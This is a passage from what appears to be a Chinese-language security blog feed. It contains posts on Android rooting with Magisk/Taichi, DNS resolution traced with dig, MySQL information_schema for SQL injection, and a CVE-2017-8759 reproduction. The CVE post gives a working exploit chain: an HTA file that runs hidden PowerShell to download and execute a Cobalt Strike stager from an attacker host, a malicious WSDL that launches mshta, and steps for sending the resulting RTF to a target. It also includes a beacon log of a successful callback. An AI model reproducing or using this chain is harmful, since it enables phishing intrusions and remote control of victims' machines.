href="https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/">https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/</a><br><a href="https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6">https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6</a></p>
]]></content>
      <categories>
        <category>web-sec</category>
      </categories>
  </entry>
  <entry>
    <title>Magisk Taichi Android 9 安装</title>
    <url>/android/Magisk-Taichi-Android-9-%E5%AE%89%E8%A3%85.html</url>
    <content><![CDATA[<p>[TOC]</p>
<p>Android 9上已经不支持Xposed了，所以需要安抚Magisk Taichi。功能与Xposed基本相同。</p>
<p>下面的安装步骤是基于谷歌新儿子-Pixel 一代的。其他手机请在第一步的时候，也就是安装TWRP的时候选择自己的机型。</p>
<h2 id="安装twrp"><a href="#安装twrp" class="headerlink" title="安装twrp"></a>安装twrp</h2><p><a href="https://twrp.me/google/googlepixel.html">https://twrp.me/google/googlepixel.html</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装twrp</span></span><br><span class="line">adb push twrp-pixel-installer-sailfish-3.3.0-0.zip /sdcard/</span><br><span class="line">adb reboot-bootloader</span><br><span class="line">fastboot boot path/to/twrp.img</span><br></pre></td></tr></table></figure>
<p>在twrp里面把上面push进去的zip安装了。重启。</p>
<h2 id="安装Magisk"><a href="#安装Magisk" class="headerlink" title="安装Magisk"></a>安装Magisk</h2><p><a href="https://github.com/topjohnwu/Magisk/releases">https://github.com/topjohnwu/Magisk/releases</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb push Magisk-vxxxx.zip /sdcard</span><br><span class="line">adb reboot-bootloader</span><br></pre></td></tr></table></figure>
<p>在twrp里面把上面push进去的zip安装了。重启</p>
<h1 id="如果使用taichi"><a href="#如果使用taichi" class="headerlink" title="如果使用taichi:"></a>如果使用taichi:</h1><h2 id="安装taichi-magisk模块"><a href="#安装taichi-magisk模块" class="headerlink" title="安装taichi magisk模块"></a>安装taichi magisk模块</h2><p><a href="https://github.com/taichi-framework/TaiChi/releases">https://github.com/taichi-framework/TaiChi/releases</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. adb push magisk-taichi-v6.1.0.zip /sdcard</span><br><span class="line">2. adb reboot-bootloader</span><br></pre></td></tr></table></figure>
<p>同上一步，在twrp里把magisk-taichi安装了，重启</p>
<h2 id="安装-Taichi-App"><a href="#安装-Taichi-App" class="headerlink" title="安装 Taichi App"></a>安装 Taichi App</h2><p>Install TaiChi App. You can find it in Release page of TaiChi.<br><a href="https://github.com/taichi-framework/TaiChi/releases">https://github.com/taichi-framework/TaiChi/releases</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. adb install taichi-xxxxx.apk</span><br></pre></td></tr></table></figure>


<h1 id="如果使用EdXposed"><a href="#如果使用EdXposed" class="headerlink" title="如果使用EdXposed:"></a>如果使用EdXposed:</h1><h2 id="安装EdXposed"><a href="#安装EdXposed" class="headerlink" title="安装EdXposed"></a>安装EdXposed</h2><p><a href="https://github.com/ElderDrivers/EdXposed/releases">https://github.com/ElderDrivers/EdXposed/releases</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb push EdXposed-xxxx-xxxx.zip /sdcard</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">reboot to twrp</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在twrp中安装 edxposed</span></span><br></pre></td></tr></table></figure>

<h2 id="安装-EdXposed-Manager"><a href="#安装-EdXposed-Manager" class="headerlink" title="安装 EdXposed Manager"></a>安装 EdXposed Manager</h2><p><a href="https://github.com/ElderDrivers/EdXposedManager">https://github.com/ElderDrivers/EdXposedManager</a></p>
<h2 id="安装riru"><a href="#安装riru" class="headerlink" title="安装riru"></a>安装riru</h2><p><a href="https://github.com/RikkaApps/Riru/releases">https://github.com/RikkaApps/Riru/releases</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb push magisk-riru.zip /sdcard/</span><br><span class="line">adb reboot-bootloader</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在twrp中安装 magisk-riru.zip</span></span><br></pre></td></tr></table></figure>

<h2 id="安装-Magisk-Manager"><a href="#安装-Magisk-Manager" class="headerlink" title="安装 Magisk Manager"></a>安装 Magisk Manager</h2><p><a href="https://magiskmanager.com/">https://magiskmanager.com/</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb install magiskmanager.apk</span><br></pre></td></tr></table></figure>


<p>收工。</p>
]]></content>
      <categories>
        <category>android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Magisk</tag>
        <tag>Taichi</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2017-8759 + Cobalt Strike 完美复现过程笔记</title>
    <url>/pentest/CVE-2017-8759%20+%20Cobalt%20Strike%20%E5%AE%8C%E7%BE%8E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%E7%AC%94%E8%AE%B0.html</url>
    <content><![CDATA[<p>[TOC]</p>
<blockquote>
<p>主要参考文章是来自<code>Lz1y</code> 大神的文章：<a href="http://www.lz1y.cn/wordpress/?p=799">http://www.lz1y.cn/wordpress/?p=799</a></p>
</blockquote>
<p>更新记录：</p>
<blockquote>
<p>最新修改与：2017年9月28日</p>
</blockquote>
<p>##工具</p>
<ol>
<li><a href="https://github.com/Lz1y/CVE-2017-8759.git">https://github.com/Lz1y/CVE-2017-8759.git</a></li>
<li>Cobalt Strike（请自行下载）</li>
</ol>
<p>##步骤</p>
<ol>
<li>在kali上面，执行命令<br>  <code>git clone https://github.com/Lz1y/CVE-2017-8759.git</code></li>
<li>进入cobalt strike目录，执行:<br>  <code>./teamserver 192.168.1.9 123456</code></li>
<li>在cobalt strike目录，执行<code>./cobaltstrike</code>运行cobalt strike客户端。</li>
<li>在cobalt strike中新建<code>Listener</code>，类型用<code>http</code>的，端口输入<code>80</code>。</li>
<li>进入该目录，依次修改以下文档：<br>  5.1 <code>gedit cmd.jpg</code> (先<code>cp cmd.hta cmd.jpg</code>)<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=&quot;VBScript&quot;&gt;</span><br><span class="line">Sub window_onload</span><br><span class="line">    window.resizeTo 0,0</span><br><span class="line">    window.MoveTo -100,-100</span><br><span class="line">	const impersonation = 3</span><br><span class="line">	Const HIDDEN_WINDOW = 12</span><br><span class="line">	Set Locator = CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">    Locator.Run&quot;powershell.exe -nop -w hidden -c &quot;&quot;IEX (new-object net.webclient).downloadstring(&#x27;http://192.168.1.9:80/a&#x27;)&quot;&quot;&quot;,0,FALSE</span><br><span class="line">    window.close()</span><br><span class="line">end sub</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;!--</span><br><span class="line"></span><br><span class="line">&lt;script language=&quot;VBScript&quot;&gt;</span><br><span class="line">Sub window_onload</span><br><span class="line">	const impersonation = 3</span><br><span class="line">	Const HIDDEN_WINDOW = 12</span><br><span class="line">	Set Locator = CreateObject(&quot;WbemScripting.SWbemLocator&quot;)</span><br><span class="line">	Set Service = Locator.ConnectServer()</span><br><span class="line">	Service.Security_.ImpersonationLevel=impersonation</span><br><span class="line">	Set objStartup = Service.Get(&quot;Win32_ProcessStartup&quot;)</span><br><span class="line">	Set objConfig = objStartup.SpawnInstance_</span><br><span class="line">	Set Process = Service.Get(&quot;Win32_Process&quot;)</span><br><span class="line">	Error = Process.Create(&quot;powershell.exe -nop -w hidden calc.exe&quot;, null, objConfig, intProcessID)</span><br><span class="line">	window.close()</span><br><span class="line">end sub</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">--&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<img src="/images/6159be0672af87636a5ba845eb097b115a8a5f54.png" alt="微信截图_20170927155342.png"><br>5.2 <code>gedit exploit.txt</code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">﻿&lt;definitions</span><br><span class="line">    xmlns=&quot;http://schemas.xmlsoap.org/wsdl/&quot;</span><br><span class="line">    xmlns:soap=&quot;http://schemas.xmlsoap.org/wsdl/soap/&quot;</span><br><span class="line">    xmlns:suds=&quot;http://www.w3.org/2000/wsdl/suds&quot;</span><br><span class="line">    xmlns:tns=&quot;http://schemas.microsoft.com/clr/ns/System&quot;</span><br><span class="line">    xmlns:ns0=&quot;http://schemas.microsoft.com/clr/nsassem/Logo/Logo&quot;&gt;</span><br><span class="line">    &lt;portType name=&quot;PortType&quot;/&gt;</span><br><span class="line">    &lt;binding name=&quot;Binding&quot; type=&quot;tns:PortType&quot;&gt;</span><br><span class="line">        &lt;soap:binding style=&quot;rpc&quot; transport=&quot;http://schemas.xmlsoap.org/soap/http&quot;/&gt;</span><br><span class="line">        &lt;suds:class type=&quot;ns0:Image&quot; rootType=&quot;MarshalByRefObject&quot;&gt;&lt;/suds:class&gt;</span><br><span class="line">    &lt;/binding&gt;</span><br><span class="line">    &lt;service name=&quot;Service&quot;&gt;</span><br><span class="line">        &lt;port name=&quot;Port&quot; binding=&quot;tns:Binding&quot;&gt;</span><br><span class="line">            &lt;soap:address location=&quot;http://192.168.1.9?C:\Windows\System32\mshta.exe?http://192.168.1.9/cmd.jpg&quot;/&gt;</span><br><span class="line">                        &lt;soap:address location=&quot;;</span><br><span class="line">                        if (System.AppDomain.CurrentDomain.GetData(_url.Split(&#x27;?&#x27;)[0]) == null) &#123;</span><br><span class="line">                                System.Diagnostics.Process.Start(_url.Split(&#x27;?&#x27;)[1], _url.Split(&#x27;?&#x27;)[2]);</span><br><span class="line">                                System.AppDomain.CurrentDomain.SetData(_url.Split(&#x27;?&#x27;)[0], true);</span><br><span class="line">                        &#125; //&quot;/&gt;</span><br><span class="line">        &lt;/port&gt;</span><br><span class="line">    &lt;/service&gt;</span><br><span class="line">&lt;/definitions&gt; </span><br></pre></td></tr></table></figure>
<img src="/images/0f4ad09fcc7f849df9d41ba28b009cd8c47f6d11.png" alt="微信截图_20170927155425.png"><br>​	以上两个文档的修改要与cobalt strike相对应</li>
<li>设置攻击环境：<br>  6.1 <code>Attacks -&gt; Web Drive-by -&gt; Scripted Web Delivery</code>，启动一个powershell木马，设置如下图：<br>  <img src="/images/3ca379232e73ccf4c29bddeef9a1ed09b20ecbf7.png" alt="微信截图_20170928122539.png"><br>  点击”Launch”之后，会生成一个一句话的Powershell代码，记住其中的网址部分，填写到<code>cmd.jpg</code>中，替换掉url。<br>  6.2 <code>Attacks -&gt; Web Drive-by -&gt; Host File</code>，将<code>cmd.jpg</code>，一定要将<code>Mime Type</code>修改为<code>application/hta</code>，此处生成的<code>URL</code>请填入<code>exploit.txt</code>中相应的位置。<br>  6.3 <code>Attacks -&gt; Web Drive-by -&gt; Host File</code>，将<code>exploit.txt</code>，无需特殊设置，设置好<code>Local URI</code>，点击<code>Launch</code>，复制生成的URL。此<code>URL</code>为<code>CreateRTF.py</code>脚本<code>-u</code>参数使用的。<br>  6.3 使用大神的<code>CreatRTF.py</code>生成一个rtf文档，url填写为Host <code>exploit.txt</code>时产生的url。</li>
</ol>
<p>至此，步骤完成，将生成的rtf文档发送给目标，即可在cobalt strike teamserver上得到shell。</p>
<p>##注意事项</p>
<ol>
<li>在设置<code>Listener</code>的时候，最好设置成’http’类型，若按照大神的指引选择<code>HTTPS</code>，<strong>会有证书提示</strong>，无法达到完美效果；如果需要做’https’类型的，请参考[[[Cobalt Strike]域名前置技术+SSL部署]]<a href="http://m0nst3r.me/pentest/63.html" title="[Cobalt Strike]域名前置技术+SSL部署">1</a></li>
<li>请在完整版的Office中测试。这个坑我踩了，检查半天无法复现，结果是我的Office不完整，导致不能执行。</li>
</ol>
<p>##总结<br>来看下Cobalt Strike的Teamserver 的 Weblog。<br>通过这里可以发现，当用户打开rtf的时候，目标会去根据<code>exploit.txt</code>里面的url去访问<code>cmd.jpg</code>，通过<code>cmd.jpg</code>中的指令，目标会再次发送请求，访问<code>/a</code>，这行到这里，说明目标正在使用<code>powershell</code>执行我们的一句话，之后的<code>/aGAs/</code>则是目标运行powershell脚本后访问的，至此，一个shell就会出现了。<br>明白了这个流程，我想大概也就明白各个<code>URL</code>怎么配置了吧。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">09/28 01:29:13 visit from: 12X.12X.9X.6X</span><br><span class="line">        Request: GET /cmd.jpg</span><br><span class="line">        page Serves /root/cobaltstrike/uploads/fav.jpg</span><br><span class="line">        Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)</span><br><span class="line"></span><br><span class="line">09/28 01:29:14 visit from: 12X.12X.9X.6X</span><br><span class="line">        Request: GET /a</span><br><span class="line">        page Scripted Web Delivery (powershell)</span><br><span class="line">        null</span><br><span class="line"></span><br><span class="line">09/28 01:29:15 visit from: 12X.12X.9X.6X</span><br><span class="line">        Request: GET /aGAs/</span><br><span class="line">        beacon beacon stager x86</span><br><span class="line">        Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727)</span><br></pre></td></tr></table></figure>

<p>##闲话</p>
<ol>
<li>Cobalt Strike作为网络钓鱼攻击工具使用，简直完美了。</li>
<li>第一次文章中有些错误，2017年9月28日，已完成修改。给大家带来误导，请见谅！</li>
<li>修改了多次，有问题的直接留言吧。这次应该不会有问题了。</li>
</ol>
]]></content>
      <categories>
        <category>pentest</category>
      </categories>
  </entry>
  <entry>
    <title>DNS解析过程</title>
    <url>/blaa/DNS%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B.html</url>
    <content><![CDATA[<p>如下图所示，先清空本地DNS解析缓存（windows和linux的清空方法请自行搜索），然后用dig命令查看可知：</p>
<pre><code>本地未发现缓存，直接查询根，根返回`com.`域, 在查询`com.`，返回`baidu.com.`，在查询`baidu.com.`，返回`www.baidu.com` 主机的A记录，即IP地址。
</code></pre>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">michael @ m0nst3r <span class="keyword">in</span> ~ [20:45:48]</span> </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">dscacheutil -flushcache</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">michael @ m0nst3r <span class="keyword">in</span> ~ [20:46:19]</span> </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">dig +trace www.baidu.com</span>    </span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; +trace www.baidu.com</span><br><span class="line">;; global options: +cmd</span><br><span class="line">.			14138	IN	NS	g.root-servers.net.</span><br><span class="line">.			14138	IN	NS	f.root-servers.net.</span><br><span class="line">.			14138	IN	NS	a.root-servers.net.</span><br><span class="line">.			14138	IN	NS	e.root-servers.net.</span><br><span class="line">.			14138	IN	NS	h.root-servers.net.</span><br><span class="line">.			14138	IN	NS	d.root-servers.net.</span><br><span class="line">.			14138	IN	NS	k.root-servers.net.</span><br><span class="line">.			14138	IN	NS	i.root-servers.net.</span><br><span class="line">.			14138	IN	NS	l.root-servers.net.</span><br><span class="line">.			14138	IN	NS	c.root-servers.net.</span><br><span class="line">.			14138	IN	NS	b.root-servers.net.</span><br><span class="line">.			14138	IN	NS	m.root-servers.net.</span><br><span class="line">.			14138	IN	NS	j.root-servers.net.</span><br><span class="line">;; Received 695 bytes from 192.168.1.1#53(192.168.1.1) in 5 ms</span><br><span class="line"></span><br><span class="line">com.			172800	IN	NS	a.gtld-servers.net.</span><br><span class="line">com.			172800	IN	NS	b.gtld-servers.net.</span><br><span class="line">com.			172800	IN	NS	c.gtld-servers.net.</span><br><span class="line">com.			172800	IN	NS	d.gtld-servers.net.</span><br><span class="line">com.			172800	IN	NS	e.gtld-servers.net.</span><br><span class="line">com.			172800	IN	NS	f.gtld-servers.net.</span><br><span class="line">com.			172800	IN	NS	g.gtld-servers.net.</span><br><span class="line">com.			172800	IN	NS	h.gtld-servers.net.</span><br><span class="line">com.			172800	IN	NS	i.gtld-servers.net.</span><br><span class="line">com.			172800	IN	NS	j.gtld-servers.net.</span><br><span class="line">com.			172800	IN	NS	k.gtld-servers.net.</span><br><span class="line">com.			172800	IN	NS	l.gtld-servers.net.</span><br><span class="line">com.			172800	IN	NS	m.gtld-servers.net.</span><br><span class="line">com.			86400	IN	DS	30909 8 2 E2D3C916F6DEEAC73294E8268FB5885044A833FC5459588F4A9184CF C41A5766</span><br><span class="line">com.			86400	IN	RRSIG	DS 8 1 86400 20181028050000 20181015040000 2134 . HHrLrltU/Pzku1DAAlxYsgUID+DnKajqKudOxnLwQNFKh2SkkA6le5cF ++eRShsNX7Q+lq2+5E5BMLF8+cm6zGC1VKoQLzIihdts7osyYviPvJ6/ lcCjV2OnF+EvEQhOCnBDhGkF5nmq+LIoEODyu2F51kneQqgWIjHvPvPG GGzMyTXpJC8pKo+VVDxcZf1nBjk6qHnM+dHB8aF0RS9hDupFHD55ePXD 6JIL87fmZW4be/Pe0haPtTVkzDRnY5RK5oQm7d1ryQV6NJB0sQJjSG7m nNLXofugjh5B6wWb8ZX24QYcDxSZvy52BF+DuGzkClRZQfCGDcToZx4y Lj5CGg==</span><br><span class="line">;; Received 1173 bytes from 199.7.91.13#53(d.root-servers.net) in 232 ms</span><br><span class="line"></span><br><span class="line">baidu.com.		172800	IN	NS	dns.baidu.com.</span><br><span class="line">baidu.com.		172800	IN	NS	ns2.baidu.com.</span><br><span class="line">baidu.com.		172800	IN	NS	ns3.baidu.com.</span><br><span class="line">baidu.com.		172800	IN	NS	ns4.baidu.com.</span><br><span class="line">baidu.com.		172800	IN	NS	ns7.baidu.com.</span><br><span class="line">CK0POJMG874LJREF7EFN8430QVIT8BSM.com. 86400 IN NSEC3 1 1 0 - CK0Q1GIN43N1ARRC9OSM6QPQR81H5M9A  NS SOA RRSIG DNSKEY NSEC3PARAM</span><br><span class="line">CK0POJMG874LJREF7EFN8430QVIT8BSM.com. 86400 IN RRSIG NSEC3 8 2 86400 20181020121530 20181013110530 46475 com. dwbSHWsE9XgYaIlfAvddRHnM+SyareZ63CYwXOcbO3tcu7wpslbjNn37 tbqnZa89rsIKO1mzWUdxM5fQtXXj2k+haz8SV42mtiU9WvkXBx0jnUjn 18UXq+X1u/uLfwPOIIy0tDcFW8OdQB3nE18aCVIzy9YUcrFMilNQ+vP6 OSM=</span><br><span class="line">HPVV2B5N85O7HJJRB7690IB5UVF9O9UA.com. 86400 IN NSEC3 1 1 0 - HPVVP23QUO0FP9R0A04URSICJPESKO9J  NS DS RRSIG</span><br><span class="line">HPVV2B5N85O7HJJRB7690IB5UVF9O9UA.com. 86400 IN RRSIG NSEC3 8 2 86400 20181021051422 20181014040422 46475 com. OIF0G5EhzboJ66h6mM+eslGRta4aM5M77zOMwZklsSgSBCpNdHByfteP WDx6PdN6a+QyoZQfjGjc2b8mnUxT+6rypSeHShrQdnPoFa/GtrOeWZS7 LVktINNV9hP/X2qk664VY05Q8SXSK1btMv68QXIznnx6DTZV6R4X2Dk4 mwk=</span><br><span class="line">;; Received 697 bytes from 192.42.93.30#53(g.gtld-servers.net) in 277 ms</span><br><span class="line"></span><br><span class="line">www.baidu.com.		1200	IN	CNAME	www.a.shifen.com.</span><br><span class="line">a.shifen.com.		1200	IN	NS	ns1.a.shifen.com.</span><br><span class="line">a.shifen.com.		1200	IN	NS	ns4.a.shifen.com.</span><br><span class="line">a.shifen.com.		1200	IN	NS	ns5.a.shifen.com.</span><br><span class="line">a.shifen.com.		1200	IN	NS	ns3.a.shifen.com.</span><br><span class="line">a.shifen.com.		1200	IN	NS	ns2.a.shifen.com.</span><br><span class="line">;; Received 239 bytes from 61.135.165.235#53(ns2.baidu.com) in 29 ms</span><br></pre></td></tr></table></figure>
<p>完整的流程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 本机向local dns请求www.baidu.com</span><br><span class="line">2. local dns向根域请求www.baidu.com，根域返回com.域的服务器IP</span><br><span class="line">3. 向com.域请求www.baidu.com，com.域返回baidu.com域的服务器IP</span><br><span class="line">4. 向baidu.com请求www.baidu.com，返回cname www.a.shifen.com和a.shifen.com域的服务器IP</span><br><span class="line">5. 向root域请求www.a.shifen.com</span><br><span class="line">6. 向com.域请求www.a.shife.com</span><br><span class="line">7. 向shifen.com请求</span><br><span class="line">8. 向a.shifen.com域请求</span><br><span class="line">9. 拿到www.a.shifen.com的IP</span><br><span class="line">10. localdns返回本机www.baidu.com cname www.a.shifen.com 以及 www.a.shifen.com的IP</span><br></pre></td></tr></table></figure>
<p>另外一篇文章说的比较明白，向前辈致敬：<br><a href="https://www.cnblogs.com/liyuanhong/articles/7353974.html">https://www.cnblogs.com/liyuanhong/articles/7353974.html</a></p>
]]></content>
      <categories>
        <category>blaa</category>
      </categories>
  </entry>
  <entry>
    <title>MySQL中的Information_schema介绍</title>
    <url>/sqli/MySQL%E4%B8%AD%E7%9A%84Information_schema%E4%BB%8B%E7%BB%8D.html</url>
    <content><![CDATA[<p>[TOC]<br>##介绍<br><code>information_schema</code>数据库是在<code>mysql&gt;5.0</code>版本之后产生的一个虚拟数据库，物理上并不存在。<br>information_schema数据库类似于“数据字典”，提供了访问数据库元数据的方式，即数据的数据。比如数据库名或表名、列类型、访问权限（更细化的访问方式）。<br>##<code>information_schema</code>所有数据表一揽</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> use information_schema;</span><br><span class="line">Database changed</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> tables;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Tables_in_information_schema          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> CHARACTER_SETS                        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> COLLATIONS                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> COLLATION_CHARACTER_SET_APPLICABILITY <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> COLUMNS                               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> COLUMN_PRIVILEGES                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ENGINES                               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> EVENTS                                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FILES                                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> GLOBAL_STATUS                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> GLOBAL_VARIABLES                      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KEY_COLUMN_USAGE                      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> OPTIMIZER_TRACE                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> PARAMETERS                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> PARTITIONS                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> PLUGINS                               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> PROCESSLIST                           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> PROFILING                             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> REFERENTIAL_CONSTRAINTS               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ROUTINES                              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCHEMATA                              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCHEMA_PRIVILEGES                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SESSION_STATUS                        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SESSION_VARIABLES                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> STATISTICS                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TABLES                                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TABLESPACES                           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TABLE_CONSTRAINTS                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TABLE_PRIVILEGES                      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TRIGGERS                              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> USER_PRIVILEGES                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> VIEWS                                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_LOCKS                          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_TRX                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_SYS_DATAFILES                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_LOCK_WAITS                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_SYS_TABLESTATS                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_CMP                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_METRICS                        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_CMP_RESET                      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_CMP_PER_INDEX                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_CMPMEM_RESET                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_FT_DELETED                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_BUFFER_PAGE_LRU                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_SYS_FOREIGN                    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_SYS_COLUMNS                    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_SYS_INDEXES                    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_FT_DEFAULT_STOPWORD            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_SYS_FIELDS                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_CMP_PER_INDEX_RESET            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_BUFFER_PAGE                    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_CMPMEM                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_FT_INDEX_TABLE                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_FT_BEING_DELETED               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_SYS_TABLESPACES                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_FT_INDEX_CACHE                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_SYS_FOREIGN_COLS               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_SYS_TABLES                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_BUFFER_POOL_STATS              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INNODB_FT_CONFIG                      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------+</span></span><br><span class="line"><span class="number">59</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>共有59张表，但是我们在SQL注入过程中，主要用到其中7张表，最重要的是<code>SCHEMA</code>，<code>TABLES</code>，<code>COLUMNS</code>这三张表。<br>##重要表结构<br>###SCHEMATA表<br><code>information_schema.SCHEMATA</code>表提供了当前mysql实例中所有<code>数据库</code>的信息。是<code>show databases</code>的结果。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.schemata;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line"><span class="operator">|</span> CATALOG_NAME <span class="operator">|</span> SCHEMA_NAME        <span class="operator">|</span> DEFAULT_CHARACTER_SET_NAME <span class="operator">|</span> DEFAULT_COLLATION_NAME <span class="operator">|</span> SQL_PATH <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line"><span class="operator">|</span> def          <span class="operator">|</span> information_schema <span class="operator">|</span> utf8                       <span class="operator">|</span> utf8_general_ci        <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def          <span class="operator">|</span> mysql              <span class="operator">|</span> latin1                     <span class="operator">|</span> latin1_swedish_ci      <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def          <span class="operator">|</span> performance_schema <span class="operator">|</span> utf8                       <span class="operator">|</span> utf8_general_ci        <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def          <span class="operator">|</span> test               <span class="operator">|</span> latin1                     <span class="operator">|</span> latin1_swedish_ci      <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span></span><br><span class="line"><span 